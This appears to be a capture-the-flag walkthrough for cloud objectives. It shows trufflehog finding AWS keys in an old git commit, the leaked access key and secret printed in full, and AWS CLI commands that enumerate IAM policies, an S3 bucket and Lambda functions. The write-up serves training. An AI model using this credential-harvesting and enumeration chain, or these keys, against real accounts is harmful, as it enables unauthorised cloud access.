Get chest by going left into wall once inside

# AWS CLI Intro
hint 
In the AWS command line (CLI), the Secure Token Service or STS has one _very_ useful function.
(https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/get-caller-identity.html)

![Pasted image 20221210094236](https://user-images.githubusercontent.com/50979196/209573962-f828c95c-8f2a-46e2-81ab-6a8a598019a9.png)

![Pasted image 20221209125337](https://user-images.githubusercontent.com/50979196/209573973-ec192d38-53fe-40ba-a8ef-58c630e2cc53.png)

![Pasted image 20221209125728](https://user-images.githubusercontent.com/50979196/209573990-37759b24-930a-4a22-8b5e-43ac5a92a2fc.png)


![Pasted image 20221209125709](https://user-images.githubusercontent.com/50979196/209574000-ee604f1b-1217-4f3a-98c5-fb802985c293.png)

![Pasted image 20221209130255](https://user-images.githubusercontent.com/50979196/209574007-571d8958-fdc3-4486-9cc5-63b7c44118d1.png)

![Pasted image 20221209130217](https://user-images.githubusercontent.com/50979196/209574023-de9e1707-1037-4029-884b-1f3849c0b917.png)

# Git repo
Use the terminal on top
![Pasted image 20221209133522](https://user-images.githubusercontent.com/50979196/209574036-8e04b5ce-e4e7-43da-8390-c27b5f12b959.png)


```
https://haugfactory.com/asnowball/aws_scripts.git
```
```
## Checkout Old Commits
_From: Jill Underpole
Objective: [Trufflehog Search]
If you want to look at an older code commit with git, you can 
`git checkout CommitNumberHere`.
```
```
## Trufflehog Tool
_From: Jill UnderpolE
Objective: [Trufflehog Search]
You can search for secrets in a Git repo with `trufflehog git https://some.repo/here.git`.
```
![Pasted image 20221209170059](https://user-images.githubusercontent.com/50979196/209574046-70bda1c8-435f-43c7-ba34-683854f949a4.png)


Answer: put_policy.py


# Explotation via AWS CLI

hint , you should know the difference between managed and inline policies
![Pasted image 20221209170746](https://user-images.githubusercontent.com/50979196/209574066-db47d44a-be8e-473e-886a-bf94c66dc4d3.png)

![Pasted image 20221209171505](https://user-images.githubusercontent.com/50979196/209574074-944f97c9-0639-4821-b587-fbbfbf0dccd4.png)

![Pasted image 20221209171519](https://user-images.githubusercontent.com/50979196/209574082-42d4d56f-01e2-4c7c-a379-7a9bcce08ba7.png)
![Pasted image 20221209171532](https://user-images.githubusercontent.com/50979196/209574101-844aa894-3616-4930-9398-4b0df5d2e40f.png)


![Pasted image 20221210085224](https://user-images.githubusercontent.com/50979196/209574110-67483259-49c7-4e27-a54e-7fd61d8b2e76.png)

![Pasted image 20221210085306](https://user-images.githubusercontent.com/50979196/209574120-fb68bdde-76b3-4bb0-be5b-2c7fcd30a438.png)



looking at the commit that trufflehog detects
use the hint from before
git checkout {commit#}
cd into put_policy.py
```
iam = boto3.client('iam',
    region_name='us-east-1',
    aws_access_key_id="AKIAAIDAYRANYAHGQOHD",
    aws_secret_access_key="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",
)

```

![Pasted image 20221210092600](https://user-images.githubusercontent.com/50979196/209574138-dbd4e2fa-feaf-474e-9d76-3d5cd269b93e.png)
```

{
    "UserId": "AIDAJNIAAQYHIAAHDDRA",
    "Account": "602123424321",
    "Arn": "arn:aws:iam::602123424321:user/haug"
}
```

user from above haug
Answer:
```
aws iam list-attached-user-policies --user-name haug
```
![Pasted image 20221210093044](https://user-images.githubusercontent.com/50979196/209574158-255d0ad1-6545-4327-a733-4e654775be13.png)


![Pasted image 20221210093027](https://user-images.githubusercontent.com/50979196/209574165-2c53e377-95c0-43f0-871a-f0e121e4a7b3.png)


![Pasted image 20221210093254](https://user-images.githubusercontent.com/50979196/209574173-cfebde1b-cac6-4bab-9ce0-40e9efc588c0.png)

```
aws iam get-policy --policy-arn "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"
```
![Pasted image 20221210093204](https://user-images.githubusercontent.com/50979196/209574182-9565eed4-2322-4d70-a2fb-a3069857ea1c.png)


![Pasted image 20221210093340](https://user-images.githubusercontent.com/50979196/209574187-aad50ed4-7405-458f-afef-d669db90857c.png)


![Pasted image 20221210093551](https://user-images.githubusercontent.com/50979196/209574193-1508493c-55b8-4b57-b236-81984a3d2d71.png)


```
aws iam get-policy-version --policy-arn "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY" --version-id "v1"
```

![Pasted image 20221210093518](https://user-images.githubusercontent.com/50979196/209574199-f322e7aa-0908-4f02-b64d-446deca8715a.png)


```
aws iam list-user-policies --user-name haug
```

![Pasted image 20221210093819](https://user-images.githubusercontent.com/50979196/209574217-51e9e44d-daed-42ed-8105-ed11bd2b1a78.png)

![Pasted image 20221210093804](https://user-images.githubusercontent.com/50979196/209574229-cea7e610-4953-4fd0-a27b-bedadd681d98.png)

```
aws iam get-user-policy --user-name haug --policy-name S3Perms
```
![Pasted image 20221210094024](https://user-images.githubusercontent.com/50979196/209574258-9b4ab0f4-c19c-4df0-a7f2-5cd5d8618a3c.png)

![Pasted image 20221210094236](https://user-images.githubusercontent.com/50979196/209574239-f5e0375d-c4c8-4a4b-ac3b-0f427ae1d546.png)


```
aws s3api list-objects --bucket "smogmachines3"
```


![Pasted image 20221210094217](https://user-images.githubusercontent.com/50979196/209574276-592a0bf8-be06-45c2-9c4b-d1fc0807a6d2.png)

```
aws lambda list-functions
```

![Pasted image 20221210094530](https://user-images.githubusercontent.com/50979196/209574504-8512969e-872f-4852-ae7b-14225a480300.png)


```
aws lambda get-function-url-config --function-name smogmachine_lambda
```

![Pasted image 20221210103230](https://user-images.githubusercontent.com/50979196/209574495-7447b07b-8417-419f-99b8-c0cf70d04d44.png)
